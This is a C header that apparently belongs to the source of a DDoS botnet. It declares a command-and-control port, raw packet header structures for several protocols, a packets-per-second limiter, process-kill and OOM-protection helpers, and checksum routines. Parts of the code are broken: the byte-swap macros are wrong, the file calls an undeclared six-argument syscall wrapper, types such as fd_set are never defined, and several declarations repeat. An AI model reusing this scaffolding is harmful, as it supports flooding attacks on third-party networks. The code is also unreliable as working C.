#pragma once

#ifndef _TYPES_H
#define _TYPES_H
typedef unsigned char uint8_t;
typedef unsigned short uint16_t;
typedef unsigned int uint32_t;
typedef unsigned long long uint64_t;
typedef long long int64_t;
typedef unsigned long size_t;
typedef unsigned int socklen_t;
typedef long time_t;
#endif

typedef long clock_t;
struct in_addr {
    uint32_t s_addr;
};

struct timespec {
    long tv_sec;
    long tv_nsec;
};
typedef unsigned long pthread_t;
typedef struct {
    void *data;
} pthread_attr_t;
typedef struct {
    int _flags;
    void *_IO_read_ptr;
    void *_IO_read_end;
    void *_IO_read_base;
    void *_IO_write_ptr;
    void *_IO_write_end;
    void *_IO_write_base;
    void *_IO_buf_base;
    void *_IO_buf_end;
    char *_save_base;
    char *_save_end;
    char *_markers;
    char *_cur_marker;
} FILE;
typedef int pid_t;
typedef unsigned long long uintptr_t;
typedef long ssize_t;
typedef unsigned long ino_t;
typedef unsigned long dev_t;
typedef unsigned long nlink_t;
typedef unsigned long blksize_t;
typedef unsigned long blkcnt_t;
typedef unsigned short mode_t;
typedef unsigned int uid_t;
typedef unsigned int gid_t;
typedef long off_t;

struct sched_param {
    int sched_priority;
};

struct stat {
    dev_t st_dev;
    ino_t st_ino;
    nlink_t st_nlink;
    mode_t st_mode;
    uid_t st_uid;
    gid_t st_gid;
    dev_t st_rdev;
    off_t st_size;
    blksize_t st_blksize;
    blkcnt_t st_blocks;
    time_t st_atime;
    time_t st_mtime;
    time_t st_ctime;
};


/* Utility functions */
#define NTOHS(x) ((uint16_t)(((x) >> 8) | ((x) & 0xFF)))
#define HTONS(x) ((uint16_t)(((x) << 8) | ((x) & 0xFF)))
#define NTOHL(x) ((uint32_t)(((x) >> 24) | (((x) >> 8) & 0xFF00) | (((x) << 8) & 0xFF0000) | ((x) << 24)))
#define HTONL(x) ((uint32_t)(((x) << 24) | (((x) << 8) & 0xFF0000) | (((x) >> 8) & 0xFF00) | ((x) >> 24)))

/* Constants */
#define O_RDONLY 0
#define F_SETFL 4
#define O_NONBLOCK 04000
#define SIGKILL 9
#define FALSE 0
#define TRUE 1
#define C2_PORT 8080

/* Directory structures */
typedef struct {
    int fd;
    size_t buf_pos;
    size_t buf_end;
    char buf[1024];
} DIR;

struct dirent {
    uint64_t d_ino;
    int64_t d_off;
    unsigned short d_reclen;
    char d_name[256];
};

/* PPS limiter structure */
struct pps_limiter {
    uint32_t pps_target;
    uint32_t packets_sent;
    uint32_t last_sec;
};

/* Function declarations */
DIR *sys_opendir(const char *name);
struct dirent *sys_readdir(DIR *dirp);
int sys_closedir(DIR *dirp);
char *sys_strstr(const char *h, const char *n);
void sys_printf(const char *fmt, ...);
void pps_limit_init(struct pps_limiter *limiter, uint32_t min_pps, uint32_t max_pps);
int sys_fcntl(int fd, int cmd, long arg);
int sys_connect(int sockfd, void *addr, socklen_t addrlen);
int sys_recvfrom(int sockfd, void *buf, size_t len, int flags, void *src_addr, socklen_t *addrlen);
time_t sys_time(time_t *t);
int sys_getpid(void);
int sys_getppid(void);
int sys_fork(void);
void pps_limit_wait(struct pps_limiter *limiter, uint32_t min_pps, uint32_t max_pps);
int sys_open(const char *pathname, int flags, int mode);
ssize_t sys_read(int fd, void *buf, size_t count);
int sys_kill(int pid, int sig);
void sys_exit(int status);
void itoa(int value, int base, char *str);
int sys_recvfrom(int sockfd, void *buf, size_t len, int flags, void *src_addr, socklen_t *addrlen);
struct resolved *lookup_domain(char *domain);
int sys_connect(int sockfd, void *addr, socklen_t addrlen);
long sys_sysconf(int name);
int sys_fcntl(int fd, int cmd, long arg);
void sys_signal(int signum, void (*handler)(int));
void set_oom_protection(void);
uint32_t _local_addr(void);
uint32_t CONVERT_ADDR(uint32_t addr);
int sys_setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
int sys_getsockopt(int sockfd, int level, int optname, void *optval, socklen_t *optlen);
time_t sys_time(time_t *t);
char *sys_strstr(const char *haystack, const char *needle);
int sys_close(int fd);
size_t strlen(const char *s);
int atoi(const char *str);
void *malloc(size_t size);
void free(void *ptr);
void *realloc(void *ptr, size_t size);
int system(const char *command);
int strcmp(const char *s1, const char *s2);
int memcmp(const void *s1, const void *s2, size_t n);
void _zero(void *ptr, size_t len);
size_t _strlen(const char *s);
void _memcpy(void *dest, const void *src, size_t n);
uint32_t ntohl(uint32_t netlong);
uint32_t htonl(uint32_t hostlong);
int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
int sendto(int sockfd, void *buf, size_t len, int flags, struct sockaddr *dest_addr, socklen_t addrlen);
void *calloc(size_t nmemb, size_t size);
void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
int usleep(int usec);
int sys_usleep(unsigned int usec);
int printf(const char *format, ...);
int socket(int domain, int type, int protocol);
uint16_t htons(uint16_t hostshort);
uint16_t ntohs(uint16_t netshort);
uint32_t ntohl(uint32_t netlong);
uint32_t htonl(uint32_t hostlong);
int connect(int sockfd, const void *addr, socklen_t addrlen);
int close(int fd);
int write(int fd, const void *buf, size_t count);
int select(int nfds, void *readfds, void *writefds, void *exceptfds, void *timeout);
int read(int fd, void *buf, size_t count);
int rand(void);
typedef long intptr_t;
uint32_t inet_addr(const char *cp);
uint16_t htons(uint16_t hostshort);
uint16_t ntohs(uint16_t netshort);
char *inet_ntoa(struct in_addr in);
int snprintf(char *str, size_t size, const char *format, ...);
int sprintf(char *str, const char *format, ...);
int sys_sprintf(char *str, const char *format, ...);
int printf(const char *format, ...);
long _syscall5(long number, long arg1, long arg2, long arg3, long arg4, long arg5);
int vsprintf(char *str, const char *format, void *args);
int vfprintf(FILE *stream, const char *format, void *args);
clock_t clock(void);
int sleep(int seconds);
char *strcpy(char *dest, const char *src);
char *strcat(char *dest, const char *src);
int fflush(FILE *stream);
extern FILE *stdout;
#define FD_ZERO(set) memset((set), 0, sizeof(fd_set))
#define FD_SET(fd, set) ((set)->fds_bits |= (1 << (fd)))
#define FD_ISSET(fd, set) ((set)->fds_bits & (1 << (fd)))
#define FD_CLR(fd, set) ((set)->fds_bits &= ~(1 << (fd)))
#define _SC_NPROCESSORS_ONLN 1
#define MSG_NOSIGNAL 0x4000
#define MSG_DONTWAIT 0x40
extern int errno;
#define EAGAIN 11
#define EWOULDBLOCK 11
#define EINTR 4
#define ECONNREFUSED 111
#define ENETUNREACH 101
#define EHOSTUNREACH 113
#define EINPROGRESS 115
#define AF_INET 2
#define PF_INET 2
#define INADDR_ANY 0
#define SOCK_STREAM 1
#define SOCK_DGRAM 2
#define SOCK_RAW 3
#define IPPROTO_UDP 17
#define IPPROTO_TCP 6
#define IPPROTO_ICMP 1
#define IPPROTO_RAW 255
#define IPPROTO_GRE 47
#define IPPROTO_IP 0
#define IP_HDRINCL 3
#define POLLIN 1
#define POLLOUT 2
#define POLLERR 4
#define POLLHUP 8
#define POLLNVAL 16
#define SCHED_FIFO 1
#define SOL_SOCKET 1
#define SO_ERROR 4
#define SO_KEEPALIVE 9
#define SO_RCVTIMEO 20
#define TCP_NODELAY 1
#define ICMP_ECHO 8
#define __NR_mprotect 10
#define __NR_sendto 44
#define __NR_nanosleep 35
#define __NR_sleep 162
#define __NR_poll 7
#define __NR_setsockopt 54

struct sockaddr {
    uint16_t sa_family;
    char sa_data[14];
};

struct pollfd {
    int fd;
    short events;
    short revents;
};

struct sockaddr_in {
    uint16_t sin_family;
    uint16_t sin_port;
    struct {
        uint32_t s_addr;
    } sin_addr;
    char sin_zero[8];
};

struct udphdr {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

struct iphdr {
    unsigned char version_ihl;
    unsigned char tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    unsigned char ttl;
    unsigned char protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t res1:4;
    uint16_t doff:4;
    uint16_t fin:1;
    uint16_t syn:1;
    uint16_t rst:1;
    uint16_t psh:1;
    uint16_t ack:1;
    uint16_t urg:1;
    uint16_t res2:2;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

struct icmphdr {
    unsigned char type;
    unsigned char code;
    uint16_t checksum;
    union {
        struct {
            uint16_t id;
            uint16_t sequence;
        } echo;
        uint32_t gateway;
        struct {
            uint16_t __glibc_reserved;
            uint16_t mtu;
        } frag;
    } un;
};

struct grehdr {
    uint16_t flags;
    uint16_t protocol;
};

/* Constants */
#define ETH_P_IP 0x0800

/* System call wrappers */
#define sys_sendto(fd, buf, len, flags, addr, addrlen) _syscall6(__NR_sendto, fd, (long)buf, (long)len, (long)flags, (long)addr, (long)addrlen)
#define sys_socket(domain, type, protocol) socket(domain, type, protocol)
#define sys_setsockopt(fd, level, optname, optval, optlen) setsockopt(fd, level, optname, optval, optlen)

/* Missing function declarations */
uint32_t rand_next_range(uint32_t min, uint32_t max);
void rand_str(char *data, int len);
uint16_t checksum_generic(uint16_t *addr, uint32_t count);

/* Additional constants for checksum */
#define CHECKSUM_IPV4_HEADER 0

/* Debug function */
void debug(const char *format, ...);
